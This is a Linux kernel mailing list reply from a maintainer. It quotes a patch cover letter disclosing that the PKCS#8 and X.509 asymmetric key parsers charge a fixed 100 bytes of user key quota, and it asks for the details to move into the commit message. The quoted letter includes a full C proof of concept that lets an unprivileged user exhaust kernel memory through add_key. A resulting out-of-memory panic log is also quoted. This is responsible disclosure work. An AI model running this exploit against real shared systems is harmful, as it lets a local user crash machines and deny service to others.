Received: from mail-ej2-f42.google.com (mail-ej2-f42.google.com [74.125.228.170])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id A856A49F106
	for <linux-crypto@vger.kernel.org>; Fri, 25 Sep 2026 16:12:45 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=74.125.228.170
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1790352768; cv=none; b=MN0/9HZ8tLBNIIc6oyVudK5Gx9U8OwWVGAJZUu6zMULc8XRQzi94Tz3L+HJOYhMxS7XU3vB4iyxTDU9cRcRdt2HvfgHyiSMT83bHK/3gpEJ7l2Bga2ZKBDU/cFmvCTfJ5dsvOhzPqSJQV489dDAuCLpq+lUl8Ko2H2HtzWBVqZ0=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1790352768; c=relaxed/simple;
	bh=vrQf2mrYbT7jNqO/FrzprzNPDuj6uTq+YuZmoSojmNo=;
	h=MIME-Version:References:In-Reply-To:From:Date:Message-ID:Subject:
	 To:Cc:Content-Type; b=uK3qkuSWnm1Yd1rhYQ6dFd98z/9kTJDkDRDVi+99Yx9L5g78fm2BrtHM0Le6MQIjuQu/k22OPBmqIxZuvXw1urpDg48oZNn/x4Ec3iwRYE/MEJJK6bxJVO2LWwa7D56otkIa3I0U4UP170VEAh0rqWJDQx3TLSgmwI6zdAStWKY=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=none (p=none dis=none) header.from=linux.win; spf=pass smtp.mailfrom=gmail.com; arc=none smtp.client-ip=74.125.228.170
Authentication-Results: smtp.subspace.kernel.org; dmarc=none (p=none dis=none) header.from=linux.win
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
Received: by mail-ej2-f42.google.com with SMTP id a640c23a62f3a-c2afd63c3e0so39551366b.0
        for <linux-crypto@vger.kernel.org>; Fri, 25 Sep 2026 09:12:45 -0700 (PDT)
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20260707; t=1790352764; x=1790957564;
        h=content-transfer-encoding:content-type:cc:to:subject:message-id
         :date:from:in-reply-to:references:mime-version:x-gm-gg
         :x-gm-message-state:from:to:cc:subject:date:message-id:reply-to
         :content-type;
        bh=BziVQfdZV4sGmL5XYBIvIrmzaMllt3XOtKCm8cyts5U=;
        b=UC573GCciPz4/uzKnVwC10Tv18SbtQel0T5YleXs/Liofy+38UAayRT1s+/4ncSkSj
         wzj47kiJJuOFXJhS0r10EFtlaQXGOm97xXupWikmCyLLwgKb5dHRMKxrrswsupLn4kEC
         WK58IZ0ttfr0Yg1GhMXcYochW9xRfMdf8D1Mh/0fl78ZS3E6YdOvo3G4YyW5QnmFrjtD
         IRlzfbFz0X4cyOJ2f8MhSyjt9tMgCmoG0cyKDS9sg/E+I3HObe0gJiLSfzfM4Q0a6Yrq
         r3D9cFxywrLvAHfpBiqR8FnOjNzIOXgDD6nqqcp8xbMKbrRMTMbU6heyL4hOLT8mi7G/
         h/kw==
X-Gm-Message-State: AFuF++m5UXg3HHCMpfsvWjeZKa3BQa07A55/SMIg1sCUmEBDCcsaxX5u
	EVMqYITrq0BgFlDuJLxd8O6uYXd7f4Ot8qu6iwx3sGZzAzsgK8TWePlCw9dOrRqY9VE=
X-Gm-Gg: AYBFou0jrfRM5APnaY731TZEp0HbBAEWrX3+w8zNIylwLOJHQjbncBFr/LpqWEkWmje
	Ri8DF9FGpPjRzyE/yXBrkv1sMwiDXgoy3Lw/BRwOOUZIcqP+kdMO0pMQ01GIGBKAdBH/8IA+pua
	NEM7AlgNesRMT6TaQdBSqzNKTHNL0WJuIpfb8G7fXJBmy+oeQ0Vj5D3YSuk1GWYYu81bziu4ovc
	8NROuVb/LmmcOfmh7ijzPqd6WnogEU679ANbB7fS2x4V+0tqGps/9XIT1FCt8quQ175zStl7i+j
	P3YftHMW31hUhIJ9Vb2xPjCES3GranO3F9mtGdhfQtmDsls07bYGg4G93P3gAzuWW0ub01hDEqg
	rFPlxDx+mMUttktHNK7baIgzN5Cikg87bikVZFjuDZ6KYQwJ5SWS0p0b1S3UttpsuPmc3B1lGQ3
	oAQjqRLXU7sajlhvvNqsMXUutOnIl8vofNG+QGpxKLDl8y93ePn/S9LXI+8L4Q9ZVfkvN/Jwp9m
	hrnj/SmlazWI1tRbupGEz3IZ9t7hZsZoGF1Avzbpg==
X-Received: by 2002:a17:907:a893:b0:c29:4915:83cb with SMTP id a640c23a62f3a-c2ac262664fmr641979966b.39.1790352763700;
        Fri, 25 Sep 2026 09:12:43 -0700 (PDT)
Received: from mail-ej2-f12.google.com (mail-ej2-f12.google.com. [74.125.228.140])
        by smtp.gmail.com with ESMTPSA id a640c23a62f3a-c2ae7821bf9sm132206966b.59.2026.09.25.09.12.41
        for <linux-crypto@vger.kernel.org>
        (version=TLS1_3 cipher=TLS_AES_128_GCM_SHA256 bits=128/128);
        Fri, 25 Sep 2026 09:12:43 -0700 (PDT)
Received: by mail-ej2-f12.google.com with SMTP id a640c23a62f3a-c29d50b7cf9so174137966b.2
        for <linux-crypto@vger.kernel.org>; Fri, 25 Sep 2026 09:12:41 -0700 (PDT)
X-Received: by 2002:a17:907:868d:b0:c26:24ed:39e5 with SMTP id
 a640c23a62f3a-c2ac2427928mr614900666b.18.1790352761318; Fri, 25 Sep 2026
 09:12:41 -0700 (PDT)
Precedence: bulk
X-Mailing-List: linux-crypto@vger.kernel.org
List-Id: <linux-crypto.vger.kernel.org>
List-Subscribe: <mailto:linux-crypto+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:linux-crypto+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
References: <cover.1789801335.git.xuyuqiabc@gmail.com>
In-Reply-To: <cover.1789801335.git.xuyuqiabc@gmail.com>
From: Ignat Korchagin <ignat@linux.win>
Date: Fri, 25 Sep 2026 17:12:28 +0100
X-Gmail-Original-Message-ID: <CAOs+rJUXb5169An2OTE4JYBnNhXHEHaR9M2z5xZvUeSfA9QNrw@mail.gmail.com>
X-Gm-Features: AclHuK-sA6_5_-JSmmg1x8cUtmvbvZYobmyBJtSLEpZqw5HwXISHJ-_PL02RQRQ
Message-ID: <CAOs+rJUXb5169An2OTE4JYBnNhXHEHaR9M2z5xZvUeSfA9QNrw@mail.gmail.com>
Subject: Re: [PATCH 0/1] KEYS: Account for asymmetric key payload data in the quota
To: Yuqi Xu <xuyuqiabc@gmail.com>
Cc: linux-crypto@vger.kernel.org, David Howells <dhowells@redhat.com>, 
	Lukas Wunner <lukas@wunner.de>, Herbert Xu <herbert@gondor.apana.org.au>, 
	"David S . Miller" <davem@davemloft.net>, keyrings@vger.kernel.org, stable@vger.kernel.org, 
	Vega <vega@nebusec.ai>, Ren Wei <weir@nebusec.ai>, xuyq21@lenovo.com
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: quoted-printable

On Sat, Sep 19, 2026 at 9:46=E2=80=AFAM Yuqi Xu <xuyuqiabc@gmail.com> wrote=
:
>
> Hi Linux kernel maintainers,
>
> We found and validated an issue in
> crypto/asymmetric_keys/pkcs8_parser.c.  The bug is reachable by a
> non-root user through add_key("asymmetric", ...); it does not require a
> user or network namespace.  We've tested the fix and it should not
> affect other functionality.
>
> We will provide detailed information about the bug in this email, along
> with a reproducer.
>
> ---- details below ----
>
> Bug details:

I feel these details are important and should actually go into the
commit message. Since you have only 1 patch there is no need for cover
letter (which will not end up in git anyway). Can you combine this and
the commit message in the actual patch into 1 patch and send it
without the cover letter?

> add_key("asymmetric", ...) preparses the supplied blob with the
> registered asymmetric key parsers and then instantiates the key with
> generic_key_instantiate(), which charges prep->quotalen to the owning
> user's key quota through key_payload_reserve().
>
> pkcs8_parse() ASN.1-decodes the outer PKCS#8 structure and duplicates
> the attacker-controlled PrivateKey OCTET STRING with
> kmemdup(ctx.key, ctx.key_size, GFP_KERNEL) into pub->key.
> pkcs8_key_preparse() then stores that object persistently in the
> asymmetric-key payload, but hard-codes
>
>     prep->quotalen =3D 100;
>
> so the quota records only 100 bytes regardless of the retained private
> key size.  The ASN.1 decoder accepts blobs up to 65535 bytes, so one key
> can pin about 64 KiB of kernel memory while consuming 100 quota bytes.
> With the default non-root limits (200 keys / 20000 bytes) a user can
> retain roughly 12 MiB of kernel memory instead of the 20 KiB the limit
> is meant to allow.
>
> x509_key_preparse() has the same problem: it keeps the parsed public
> key, its parameters, the signature, the key IDs and the authority key
> IDs, but also charges a fixed 100 bytes.  The same add_key() call
> reaches the X.509 parser, so fixing only PKCS#8 would leave the bypass
> reachable; the patch accounts
> for the retained payload in both parsers.
>
> Measured on v7.3-rc1 (10396a2d6d41), 2 vCPU / 2 GiB QEMU guest.  The
> test drops to uid 1000 and adds PKCS#8 keys with a 65000-byte
> PrivateKey field through add_key("asymmetric", ...):
>
> Before the patch (/proc/key-users, uid 1000):
>   1000:     5 5/5 5/200 259/20000
>   added 176 keys; last add_key: -1 errno=3D122 (Disk quota exceeded)
>   1000:   182 182/181 181/200 19971/20000
> 176 keys retained about 11.4 MiB of kernel memory, but were charged only
> 19971 - 259 =3D 19712 bytes in total, about 112 bytes per key.
>
> After the patch:
>   1000:     5 5/5 5/200 1139/20000
>   added 0 keys; last add_key: -1 errno=3D122 (Disk quota exceeded)
> The oversized key is rejected immediately, while a small PKCS#8 key
> (200-byte PrivateKey) still loads and is charged 264 bytes.
>
> The same holds for a small X.509 certificate whose only large object is
> a 26000-byte authorityKeyIdentifier key ID: the patch rejects it, while
> the unpatched kernel accepted it and charged 109 bytes.
>
> The panic log below was captured by the report during the initial
> validation.
>
> Reproducer:
>
>   gcc -O2 -static -o poc poc.c
>   ./poc
>
> Run the PoC as an unprivileged user; no namespace is needed.  We run it
> in a 2 vCPU, 2 GB RAM x86 QEMU environment.
>
> ------BEGIN poc.c------
>
> #define _GNU_SOURCE
>
> #include <errno.h>
> #include <inttypes.h>
> #include <linux/keyctl.h>
> #include <stdbool.h>
> #include <stdint.h>
> #include <stdio.h>
> #include <stdlib.h>
> #include <string.h>
> #include <sys/mman.h>
> #include <sys/syscall.h>
> #include <sys/types.h>
> #include <time.h>
> #include <unistd.h>
>
> typedef int32_t key_serial_t;
>
> struct options {
>         size_t payload_size;
>         size_t key_count;
>         size_t anon_mb;
>         unsigned pause_secs;
>         bool revoke_on_exit;
> };
>
> static void usage(const char *prog)
> {
>         fprintf(stderr,
>                 "Usage: %s [--payload-size BYTES] [--key-count N] [--anon=
-mb MB]\n"
>                 "          [--pause SECS] [--revoke-on-exit]\n",
>                 prog);
> }
>
> static size_t der_len_bytes(size_t len)
> {
>         size_t n =3D 0;
>
>         if (len < 0x80)
>                 return 1;
>
>         while (len) {
>                 n++;
>                 len >>=3D 8;
>         }
>
>         return 1 + n;
> }
>
> static size_t der_put_len(unsigned char *dst, size_t len)
> {
>         size_t n =3D 0;
>         size_t tmp =3D len;
>
>         if (len < 0x80) {
>                 dst[0] =3D (unsigned char)len;
>                 return 1;
>         }
>
>         while (tmp) {
>                 n++;
>                 tmp >>=3D 8;
>         }
>
>         dst[0] =3D 0x80 | n;
>         for (size_t i =3D 0; i < n; i++)
>                 dst[1 + i] =3D (unsigned char)(len >> ((n - 1 - i) * 8));
>
>         return 1 + n;
> }
>
> static unsigned char *build_pkcs8(size_t payload_size, size_t *blob_len_o=
ut)
> {
>         static const unsigned char algo_id[] =3D {
>                 0x30, 0x0d,
>                 0x06, 0x09, 0x2a, 0x86, 0x48, 0x86, 0xf7,
>                 0x0d, 0x01, 0x01, 0x01,
>                 0x05, 0x00,
>         };
>         const size_t octet_total =3D 1 + der_len_bytes(payload_size) + pa=
yload_size;
>         const size_t seq_content_len =3D 3 + sizeof(algo_id) + octet_tota=
l;
>         const size_t blob_len =3D 1 + der_len_bytes(seq_content_len) + se=
q_content_len;
>         unsigned char *blob;
>         unsigned char *p;
>
>         blob =3D malloc(blob_len);
>         if (!blob)
>                 return NULL;
>
>         p =3D blob;
>         *p++ =3D 0x30;
>         p +=3D der_put_len(p, seq_content_len);
>
>         *p++ =3D 0x02;
>         *p++ =3D 0x01;
>         *p++ =3D 0x00;
>
>         memcpy(p, algo_id, sizeof(algo_id));
>         p +=3D sizeof(algo_id);
>
>         *p++ =3D 0x04;
>         p +=3D der_put_len(p, payload_size);
>
>         for (size_t i =3D 0; i < payload_size; i++)
>                 p[i] =3D (unsigned char)(i * 131u + 7u);
>         p +=3D payload_size;
>
>         if ((size_t)(p - blob) !=3D blob_len) {
>                 fprintf(stderr, "internal length mismatch: %zu !=3D %zu\n=
",
>                         (size_t)(p - blob), blob_len);
>                 free(blob);
>                 return NULL;
>         }
>
>         *blob_len_out =3D blob_len;
>         return blob;
> }
>
> static long add_key_syscall(const char *type, const char *desc,
>                             const void *payload, size_t plen,
>                             key_serial_t ringid)
> {
>         return syscall(SYS_add_key, type, desc, payload, plen, ringid);
> }
>
> static long keyctl_syscall(int cmd, unsigned long arg2, unsigned long arg=
3,
>                            unsigned long arg4, unsigned long arg5)
> {
>         return syscall(SYS_keyctl, cmd, arg2, arg3, arg4, arg5);
> }
>
> static void *spray_anon(size_t anon_mb)
> {
>         const size_t bytes =3D anon_mb * 1024ULL * 1024ULL;
>         const long page_size =3D sysconf(_SC_PAGESIZE);
>         unsigned char *mapping;
>
>         if (!anon_mb)
>                 return NULL;
>
>         mapping =3D mmap(NULL, bytes, PROT_READ | PROT_WRITE,
>                        MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
>         if (mapping =3D=3D MAP_FAILED) {
>                 perror("mmap anon");
>                 return NULL;
>         }
>
>         for (size_t off =3D 0; off < bytes; off +=3D (size_t)page_size)
>                 mapping[off] =3D (unsigned char)(off / (size_t)page_size)=
;
>
>         printf("[*] touched %zu MiB of anonymous memory\n", anon_mb);
>         fflush(stdout);
>         return mapping;
> }
>
> static unsigned long parse_u64(const char *name, const char *value)
> {
>         char *end =3D NULL;
>         unsigned long long out;
>
>         errno =3D 0;
>         out =3D strtoull(value, &end, 0);
>         if (errno || !end || *end) {
>                 fprintf(stderr, "bad value for %s: %s\n", name, value);
>                 exit(1);
>         }
>
>         return (unsigned long)out;
> }
>
> int main(int argc, char **argv)
> {
>         struct options opt =3D {
>                 .payload_size =3D 65000,
>                 .key_count =3D 178,
>                 .anon_mb =3D 700,
>                 .pause_secs =3D 0,
>                 .revoke_on_exit =3D false,
>         };
>         unsigned char *blob =3D NULL;
>         size_t blob_len =3D 0;
>         key_serial_t *serials =3D NULL;
>         void *anon_mapping =3D NULL;
>         size_t added =3D 0;
>         char ring_name[64];
>         int ret =3D 0;
>
>         for (int i =3D 1; i < argc; i++) {
>                 if (!strcmp(argv[i], "--payload-size") && i + 1 < argc) {
>                         opt.payload_size =3D parse_u64("--payload-size", =
argv[++i]);
>                 } else if (!strcmp(argv[i], "--key-count") && i + 1 < arg=
c) {
>                         opt.key_count =3D parse_u64("--key-count", argv[+=
+i]);
>                 } else if (!strcmp(argv[i], "--anon-mb") && i + 1 < argc)=
 {
>                         opt.anon_mb =3D parse_u64("--anon-mb", argv[++i])=
;
>                 } else if (!strcmp(argv[i], "--pause") && i + 1 < argc) {
>                         opt.pause_secs =3D parse_u64("--pause", argv[++i]=
);
>                 } else if (!strcmp(argv[i], "--revoke-on-exit")) {
>                         opt.revoke_on_exit =3D true;
>                 } else {
>                         usage(argv[0]);
>                         return 1;
>                 }
>         }
>
>         if (opt.payload_size > (1024U * 1024U - 128U)) {
>                 fprintf(stderr, "payload too large for add_key limit\n");
>                 return 1;
>         }
>
>         blob =3D build_pkcs8(opt.payload_size, &blob_len);
>         if (!blob) {
>                 perror("build_pkcs8");
>                 return 1;
>         }
>
>         serials =3D calloc(opt.key_count, sizeof(*serials));
>         if (!serials) {
>                 perror("calloc serials");
>                 free(blob);
>                 return 1;
>         }
>
>         snprintf(ring_name, sizeof(ring_name), "pkcs8-n6q-%ld", (long)get=
pid());
>         if (keyctl_syscall(KEYCTL_JOIN_SESSION_KEYRING,
>                            (unsigned long)ring_name, 0, 0, 0) < 0) {
>                 perror("keyctl join_session_keyring");
>                 ret =3D 1;
>                 goto out;
>         }
>
>         printf("[*] payload_size=3D%zu blob_len=3D%zu key_count=3D%zu ano=
n_mb=3D%zu\n",
>                opt.payload_size, blob_len, opt.key_count, opt.anon_mb);
>         fflush(stdout);
>
>         anon_mapping =3D spray_anon(opt.anon_mb);
>         if (opt.anon_mb && !anon_mapping) {
>                 ret =3D 1;
>                 goto out;
>         }
>
>         for (size_t i =3D 0; i < opt.key_count; i++) {
>                 char desc[32];
>                 long serial;
>
>                 snprintf(desc, sizeof(desc), "k%06zu", i);
>                 serial =3D add_key_syscall("asymmetric", desc, blob, blob=
_len,
>                                          KEY_SPEC_SESSION_KEYRING);
>                 if (serial < 0) {
>                         fprintf(stderr,
>                                 "[!] add_key failed after %zu keys: errno=
=3D%d (%s)\n",
>                                 added, errno, strerror(errno));
>                         ret =3D 1;
>                         goto out;
>                 }
>
>                 serials[added++] =3D (key_serial_t)serial;
>                 if ((added % 10) =3D=3D 0 || added =3D=3D 1) {
>                         printf("[+] added %zu keys, last serial=3D%ld\n",
>                                added, serial);
>                         fflush(stdout);
>                 }
>         }
>
>         printf("[+] completed %zu successful add_key calls\n", added);
>         fflush(stdout);
>
>         if (opt.pause_secs) {
>                 printf("[*] sleeping for %u seconds\n", opt.pause_secs);
>                 fflush(stdout);
>                 sleep(opt.pause_secs);
>         }
>
> out:
>         if (opt.revoke_on_exit) {
>                 for (size_t i =3D 0; i < added; i++)
>                         keyctl_syscall(KEYCTL_REVOKE, serials[i], 0, 0, 0=
);
>         }
>
>         if (anon_mapping)
>                 munmap(anon_mapping, opt.anon_mb * 1024ULL * 1024ULL);
>         free(serials);
>         free(blob);
>         return ret;
> }
>
> ------END poc.c--------
>
> ----BEGIN crash log----
>
> [  291.603731][T10195] Kernel panic - not syncing: Out of memory: compuls=
ory panic_on_oom is enabled

Drop time and task id when you send splats

> [  291.604425][T10195] CPU: 1 UID: 1028 PID: 10195 Comm: poc Not tainted =
6.12.74 #3
> [  291.604946][T10195] Hardware name: QEMU Ubuntu 24.04 PC (i440FX + PIIX=
, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
> [  291.605646][T10195] Call Trace:
> [  291.605889][T10195]  <TASK>
> [  291.606112][T10195]  dump_stack_lvl+0x3b/0x1f0
> [  291.606466][T10195]  panic+0x6fe/0x7e0
> [  291.606767][T10195]  ? dump_header+0x6c2/0x950
> [  291.607117][T10195]  ? __pfx_panic+0x10/0x10
> [  291.607458][T10195]  ? srso_alias_return_thunk+0x5/0xfbef5
> [  291.607883][T10195]  ? srso_alias_return_thunk+0x5/0xfbef5
> [  291.608335][T10195]  ? out_of_memory+0x8c5/0x16b0
> [  291.608714][T10195]  out_of_memory+0x8f3/0x16b0
> [  291.609092][T10195]  ? __pfx_out_of_memory+0x10/0x10
> [  291.609483][T10195]  ? lock_acquire+0x2f/0xb0
> [  291.609824][T10195]  ? __alloc_pages_noprof+0xd59/0x26d0
> [  291.610258][T10195]  __alloc_pages_noprof+0x1ec3/0x26d0
> [  291.610688][T10195]  ? srso_alias_return_thunk+0x5/0xfbef5
> [  291.611102][T10195]  ? hlock_class+0x4e/0x130
> [  291.611463][T10195]  ? srso_alias_return_thunk+0x5/0xfbef5
> [  291.611885][T10195]  ? __pfx___alloc_pages_noprof+0x10/0x10
> [  291.612350][T10195]  ? __pfx___lock_acquire+0x10/0x10
> [  291.612755][T10195]  ? __sanitizer_cov_trace_switch+0x54/0x90
> [  291.613198][T10195]  ? srso_alias_return_thunk+0x5/0xfbef5
> [  291.613615][T10195]  ? policy_nodemask+0xf2/0x4f0
> [  291.613993][T10195]  alloc_pages_mpol_noprof+0x2ce/0x610
> [  291.614417][T10195]  ? __pfx_alloc_pages_mpol_noprof+0x10/0x10
> [  291.614859][T10195]  ? srso_alias_return_thunk+0x5/0xfbef5
> [  291.615294][T10195]  ? srso_alias_return_thunk+0x5/0xfbef5
> [  291.615709][T10195]  ? xas_load+0x49/0x5b0
> [  291.616038][T10195]  ? filemap_get_entry+0xd5/0x3c0
> [  291.616444][T10195]  folio_alloc_noprof+0x23/0xd0
> [  291.616820][T10195]  filemap_alloc_folio_noprof+0x35d/0x420
> [  291.617244][T10195]  ? __pfx_filemap_alloc_folio_noprof+0x10/0x10
> [  291.617694][T10195]  ? filemap_fault+0x631/0x2800
> [  291.618086][T10195]  __filemap_get_folio+0x53e/0xaf0
> [  291.618499][T10195]  filemap_fault+0x675/0x2800
> [  291.618878][T10195]  ? __pfx_filemap_fault+0x10/0x10
> [  291.619284][T10195]  ? do_pte_missing+0x165a/0x3ff0
> [  291.619662][T10195]  ? __pfx_lock_release+0x10/0x10
> [  291.620055][T10195]  ? __pfx_filemap_map_pages+0x10/0x10
> [  291.620471][T10195]  __do_fault+0x10f/0x4a0
> [  291.620800][T10195]  ? __pfx_filemap_map_pages+0x10/0x10
> [  291.621210][T10195]  do_pte_missing+0x174c/0x3ff0
> [  291.621585][T10195]  ? srso_alias_return_thunk+0x5/0xfbef5
> [  291.622002][T10195]  ? reacquire_held_locks+0x20b/0x4c0
> [  291.622399][T10195]  ? lock_vma_under_rcu+0x143/0x980
> [  291.622797][T10195]  __handle_mm_fault+0xfa3/0x2a10
> [  291.623201][T10195]  ? __pfx_lock_release+0x10/0x10
> [  291.623574][T10195]  ? down_read_trylock+0x1f0/0x3f0
> [  291.623959][T10195]  ? __pfx___handle_mm_fault+0x10/0x10
> [  291.624373][T10195]  ? __pfx_down_read_trylock+0x10/0x10
> [  291.624818][T10195]  ? __pfx_lock_vma_under_rcu+0x10/0x10
> [  291.625252][T10195]  handle_mm_fault+0x3f5/0xa00
> [  291.625639][T10195]  do_user_addr_fault+0x50a/0x1490
> [  291.626067][T10195]  exc_page_fault+0x5d/0xe0
> [  291.626421][T10195]  asm_exc_page_fault+0x26/0x30
> [  291.626781][T10195] RIP: 0033:0x7f7f7505e080
> [  291.627107][T10195] Code: Unable to access opcode bytes at 0x7f7f7505e=
056.
> [  291.627583][T10195] RSP: 002b:00007ffc585a1b08 EFLAGS: 00010202
> [  291.628015][T10195] RAX: 00007ffc585a2120 RBX: 00007ffc585a2040 RCX: 0=
000000000000002
> [  291.628553][T10195] RDX: 00007ffc585a2100 RSI: 0000000000000025 RDI: 0=
000560a6a8580a7
> [  291.629082][T10195] RBP: 00007ffc585a2210 R08: 00007ffc585a2230 R09: 0=
000000000000058
> [  291.629623][T10195] R10: 00007ffc585a2210 R11: 0000000000000246 R12: 0=
000560a6bf4d2a0
> [  291.630161][T10195] R13: 0000560a6bf5d0b0 R14: 00007ffc585a2100 R15: 0=
000560a6a8580a7
> [  291.630738][T10195]  </TASK>
> [  291.631265][T10195] Kernel Offset: disabled
> [  291.631642][T10195] Rebooting in 86400 seconds..
>
> -----END crash log-----
>
> Best regards,
> Yuqi Xu
>
> Yuqi Xu (1):
>   KEYS: Account for asymmetric key payload data in the quota
>
>  crypto/asymmetric_keys/pkcs8_parser.c    |  2 +-
>  crypto/asymmetric_keys/x509_public_key.c | 23 ++++++++++++++++++++++-
>  2 files changed, 23 insertions(+), 2 deletions(-)
>
>
> base-commit: 10396a2d6d41d594975b6ece712278570c3c970c
> --
> 2.55.0
>
>

Thanks
